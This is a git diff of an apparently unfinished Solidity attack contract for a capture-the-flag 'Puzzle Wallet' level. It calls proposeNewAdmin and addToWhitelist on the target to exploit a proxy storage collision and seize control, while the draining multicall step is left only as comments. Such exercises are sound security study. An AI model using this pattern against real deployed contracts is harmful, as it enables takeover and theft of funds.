@@ -6,10 +6,12 @@ import "interfaces/ipuzzlewallet.sol";
 
 
 contract Attack24 {
-    PuzzleWallet target;
+    PuzzleWallet public target;
+    // PuzzleProxy public proxy;
 
     constructor(address _targetAddress) {
         target = PuzzleWallet(_targetAddress);        
+
     }
 
     function attack(IPuzzleWallet) public {
@@ -17,8 +19,8 @@ contract Attack24 {
         // bytes[] memory data = abi.encodeWithSelector(bytes4, arg);   //   <--  HERE !!
         // set the data argument as a abi encoded multicall to deposit
         // target.multicall(data);
-        target.proposeNewAdmin(msg.sender);
-        target.addToWhitelist(msg.sender);
+        target.proposeNewAdmin(address(this));
+        target.addToWhitelist(address(this));
     }
 }
 
